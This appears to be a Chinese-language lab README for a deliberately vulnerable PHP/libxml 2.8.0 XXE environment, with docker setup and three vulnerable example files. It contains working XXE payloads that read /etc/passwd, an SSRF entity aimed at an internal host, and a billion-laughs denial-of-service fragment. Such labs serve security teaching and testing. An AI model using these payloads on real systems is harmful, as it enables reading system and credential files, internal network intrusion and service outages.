# PHP XML 外部实体注入漏洞（XXE）

XML 外部实体注入（XXE）是一种发生在应用程序解析 XML 输入时的安全漏洞。当 XML 解析器配置不当，处理包含对外部实体引用的 XML 输入时，可能导致敏感信息泄露、拒绝服务、服务器端请求伪造、端口扫描等多种攻击。

在 libxml 2.9.0 版本之后，默认禁用了外部实体解析，这在很大程度上缓解了 XXE 漏洞。本环境使用 libxml 2.8.0 版本编译进 PHP 中，以演示 PHP 应用中的 XXE 漏洞。PHP 版本本身并不影响 XXE 漏洞的利用。

参考链接：

- [OWASP XXE Prevention Cheat Sheet](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PHP Documentation: libxml](https://www.php.net/manual/en/book.libxml.php)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)

## 环境搭建

执行如下命令启动一个基于 PHP 7.0.30 和 libxml 2.8.0 的漏洞服务器：

```
docker compose up -d
```

环境启动后，访问 `http://your-ip:8080/index.php` 可以看到 phpinfo 页面。在页面中搜索 "libxml" 可以验证其版本为 2.8.0。

Web 根目录 `./www` 包含以下文件：

```bash
$ tree .
.
├── dom.php               # 示例：使用 DOMDocument 解析 XML
├── index.php
├── SimpleXMLElement.php  # 示例：使用 SimpleXMLElement 类解析 XML
└── simplexml_load_string.php  # 示例：使用 simplexml_load_string 函数解析 XML
```

这三个文件（`dom.php`、`SimpleXMLElement.php` 和 `simplexml_load_string.php`）都存在 XXE 漏洞。每个文件演示了一种可被利用的 PHP XML 解析方法。

## 漏洞复现

向上述3个文件发送以下 payload 即可读取 `/etc/passwd` 文件内容：

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<n>&xxe;</n>
</root>
```

执行结果示例：

![](1.png)

### 高级利用技巧

文件内容读取：

```xml
<!ENTITY xxe SYSTEM "file:///path/to/sensitive/file" >
```

SSRF（服务器端请求伪造）：

```xml
<!ENTITY xxe SYSTEM "http://internal.service.local" >
```

拒绝服务攻击（Billion Laughs Attack）：

```xml
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;">
```
